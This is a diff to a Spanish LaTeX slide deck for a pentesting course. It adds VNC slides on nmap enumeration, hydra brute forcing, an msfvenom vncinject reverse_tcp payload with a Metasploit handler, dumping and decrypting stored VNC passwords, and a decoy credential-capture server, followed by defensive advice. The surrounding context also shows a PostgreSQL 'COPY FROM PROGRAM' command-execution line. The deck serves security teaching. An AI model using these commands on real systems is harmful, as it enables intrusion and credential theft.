@@ -24,6 +24,7 @@
 \newcommand{\cmd}[1]{\texttt{\color{uznavy}#1}}
 % Encabezado de apartado dentro de una transparencia
 \newcommand{\lead}[1]{{\color{uznavy}\bfseries #1}\par\smallskip}
+\newcommand{\term}[1]{\emph{#1}}
 % Nota de fuente o referencia al pie de una transparencia
 \newcommand{\fuente}[1]{\par\vspace{0.25em}{\scriptsize\color{uzsteel}\raggedright #1\par}}
 % Bloque destacado para líneas de comando completas
@@ -666,6 +667,69 @@ COPY x FROM PROGRAM 'id';\ \ \ \ SELECT * FROM x;}
   \item \textbf{Monitorizacion}: alerta ante \cmd{COPY ... FROM PROGRAM}, uso de superusuario y logins fallidos.
   \end{itemize}
 \fuente{Fuente: \href{https://www.hackingarticles.in/postgresql-penetration-testing/}{PostgreSQL Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
+\begin{frame}{VNC: qué es y enumeración}
+\small
+  \begin{itemize}
+  \item \textbf{VNC} (Virtual Network Computing) da acceso grafico remoto mediante el protocolo \term{RFB}. A diferencia de RDP, es \textbf{multiplataforma} (Linux/Windows). Escucha en \cmd{5900+N} (display :N $\rightarrow$ 590N).
+  \item El RFB clasico \textbf{no cifra} y limita la contrasena a 8 caracteres: un objetivo frecuente en pentest interno.
+  \end{itemize}
+\cmdbox{nmap -p5900,5901 -sV <IP>\\
+nmap -p5901 --script vnc-info <IP>\ \ \ \ \# tipos de autenticacion y version RFB}
+\begin{center}\includegraphics[width=\textwidth,height=0.44\textheight,keepaspectratio]{img/vnc_enum.png}\end{center}
+\fuente{Fuente: \href{https://www.hackingarticles.in/vnc-penetration-testing/}{VNC Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
+\begin{frame}{VNC: cracking de credenciales y acceso}
+\small
+  \begin{itemize}
+  \item Si el servicio pide contrasena, se puede hacer fuerza bruta con \cmd{hydra} (o el modulo \cmd{auxiliary/scanner/vnc/vnc\_login}). Con \cmd{vnc\_none\_auth} se detectan servidores \textbf{sin autenticacion}.
+  \end{itemize}
+\cmdbox{hydra -s 5901 -P pass.txt -t 16 <IP> vnc\\
+vncviewer <IP>:5901\ \ \ \ \# conectar al escritorio remoto}
+\begin{center}\includegraphics[width=\textwidth,height=0.46\textheight,keepaspectratio]{img/vnc_viewer.png}\end{center}
+\fuente{Fuente: \href{https://www.hackingarticles.in/vnc-penetration-testing/}{VNC Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
+\begin{frame}{VNC: acceso mediante payload (vncinject)}
+\small
+  \begin{itemize}
+  \item Metasploit puede \textbf{inyectar un servidor VNC} en la maquina victima con el payload \cmd{vncinject}: se obtiene el escritorio sin credenciales.
+  \item Desde una sesion Meterpreter previa: \cmd{run vnc} o el modulo \cmd{exploit/windows/local/payload\_inject}.
+  \end{itemize}
+\cmdbox{msfvenom -p windows/x64/vncinject/reverse\_tcp lhost=<KALI> lport=5432 -f exe > vnc.exe\\
+use exploit/multi/handler\ \ \ \ set payload windows/x64/vncinject/reverse\_tcp\ \ \ \ run}
+\begin{center}\includegraphics[width=\textwidth,height=0.40\textheight,keepaspectratio]{img/vnc_inject.png}\end{center}
+\fuente{Fuente: \href{https://www.hackingarticles.in/vnc-penetration-testing/}{VNC Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
+\begin{frame}{VNC: volcado y descifrado de credenciales}
+\small
+  \begin{itemize}
+  \item La contrasena de VNC se guarda cifrada con una \textbf{clave DES fija y publica}, asi que es \textbf{reversible} (no es un hash). Con una sesion en el objetivo se recupera en claro.
+  \end{itemize}
+\lead{Volcado con Metasploit (post-explotacion)}
+\cmdbox{use post/windows/gather/credentials/vnc\ \ \ \ set session <N>\ \ \ \ run}
+\lead{Descifrado del fichero de contrasena}
+\cmdbox{vncpwd.exe passwd\ \ \ \ (Windows)\ \ \ \ \ \ ./vncrack\_s -C ~/.vnc/passwd\ \ \ \ (Linux)}
+\begin{center}\includegraphics[width=0.62\textwidth,height=0.36\textheight,keepaspectratio]{img/vnc_creds.png}\end{center}
+\fuente{Fuente: \href{https://www.hackingarticles.in/vnc-penetration-testing/}{VNC Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
+\begin{frame}{VNC: captura de credenciales y defensa}
+\small
+  \begin{itemize}
+  \item \textbf{Servicio falso}: \cmd{auxiliary/server/capture/vnc} levanta un VNC senuelo que captura el \term{challenge-response} de quien se conecte, para crackearlo despues.
+  \end{itemize}
+\cmdbox{use auxiliary/server/capture/vnc\ \ \ \ set JOHNPWFILE /root/vnc\_hashes\ \ \ \ run}
+\lead{Defensa}
+  \begin{itemize}
+  \item \textbf{Cifrado}: el RFB clasico va en claro $\rightarrow$ tunel por SSH (\cmd{ssh -L 5901:localhost:5901 user@host}) o VPN; usar variantes con TLS.
+  \item \textbf{Exposicion}: nunca publicar \cmd{5900+} en Internet; enlazar a \cmd{localhost} y filtrar por firewall.
+  \item \textbf{Credenciales}: contrasenas fuertes (y control de acceso por usuario); revisar servidores sin autenticacion.
+  \end{itemize}
+\fuente{Fuente: \href{https://www.hackingarticles.in/vnc-penetration-testing/}{VNC Penetration Testing} --- Hacking Articles.}
 \end{frame}
 
 \begin{frame}{IRC: puerta trasera en UnrealIRCd}
